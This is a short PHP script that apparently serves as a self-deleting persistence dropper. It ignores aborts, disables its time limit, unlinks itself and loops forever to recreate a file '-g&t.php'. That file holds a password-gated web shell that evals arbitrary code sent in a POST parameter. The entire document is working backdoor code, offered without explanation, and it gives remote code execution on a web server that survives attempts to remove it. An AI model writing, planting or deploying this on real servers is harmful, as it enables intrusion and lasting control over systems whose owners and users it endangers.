<?php
ignore_user_abort(true);
set_time_limit(0);
$file = './-g&t.php';
$code = "<?php if(md5(\$_GET['pass'])=='7e079e6e92d2f69d09cb28cddc435d25'){@eval(\$_POST['cmd']);}?>";
while (1){
	if (!file_exists($file)) {
		file_put_contents($file,$code);
	}
	usleep(1);
	unlink(__FILE__);
}

?>